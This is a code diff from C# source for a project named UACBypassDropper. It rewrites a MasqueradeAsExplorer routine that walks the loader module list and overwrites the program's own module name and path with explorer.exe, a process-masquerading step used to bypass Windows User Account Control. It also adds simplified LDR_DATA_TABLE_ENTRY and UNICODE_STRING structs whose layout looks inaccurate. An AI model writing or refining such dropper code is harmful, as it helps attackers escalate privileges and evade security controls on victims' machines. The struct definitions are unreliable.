@@ -1,9 +1,7 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading.Tasks;
 using Microsoft.WindowsAPICodePack.Shell;
 
 namespace UACBypassDropper
@@ -29,31 +27,48 @@ namespace UACBypassDropper
 
         private static unsafe void MasqueradeAsExplorer()
         {
-            NativeMethods.LdrEnumerateLoadedModules(0, (entry, context, ref bool stop) =>
+            NativeMethods.LdrEnumerateLoadedModules(0, (IntPtr entryPtr, IntPtr context, ref bool stop) =>
             {
-                if (entry->DllBase == NativeMethods.GetImageBase())
+                var entry = (LDR_DATA_TABLE_ENTRY)Marshal.PtrToStructure(entryPtr, typeof(LDR_DATA_TABLE_ENTRY));
+                if (entry.DllBase == NativeMethods.GetImageBase())
                 {
                     string fakeName = "explorer.exe";
-                    fixed (char* fakeNamePtr = fakeName)
-                    {
-                        entry->BaseDllName.Buffer = fakeNamePtr;
-                        entry->BaseDllName.Length = (ushort)(fakeName.Length * 2);
-                        entry->BaseDllName.MaximumLength = (ushort)((fakeName.Length + 1) * 2);
+                    var fakeNameBuffer = Marshal.StringToHGlobalUni(fakeName);
+                    entry.BaseDllName.Buffer = fakeNameBuffer;
+                    entry.BaseDllName.Length = (ushort)(fakeName.Length * 2);
+                    entry.BaseDllName.MaximumLength = (ushort)((fakeName.Length + 1) * 2);
 
-                        string fakePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), fakeName);
-                        fixed (char* fakePathPtr = fakePath)
-                        {
-                            entry->FullDllName.Buffer = fakePathPtr;
-                            entry->FullDllName.Length = (ushort)(fakePath.Length * 2);
-                            entry->FullDllName.MaximumLength = (ushort)((fakePath.Length + 1) * 2);
-                        }
-                    }
+                    string fakePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), fakeName);
+                    var fakePathBuffer = Marshal.StringToHGlobalUni(fakePath);
+                    entry.FullDllName.Buffer = fakePathBuffer;
+                    entry.FullDllName.Length = (ushort)(fakePath.Length * 2);
+                    entry.FullDllName.MaximumLength = (ushort)((fakePath.Length + 1) * 2);
+
+                    Marshal.StructureToPtr(entry, entryPtr, true);
                     stop = true;
+                    return true;
                 }
-                return true; 
+                return false;
             }, IntPtr.Zero);
         }
 
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct LDR_DATA_TABLE_ENTRY
+        {
+            public IntPtr Reserved1;
+            public IntPtr Reserved2;
+            public IntPtr DllBase;
+            public UNICODE_STRING FullDllName;
+            public UNICODE_STRING BaseDllName;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct UNICODE_STRING
+        {
+            public ushort Length;
+            public ushort MaximumLength;
+            public IntPtr Buffer;
+        }
 
         private static void PatchEntryPoint(byte[] dllData)
         {
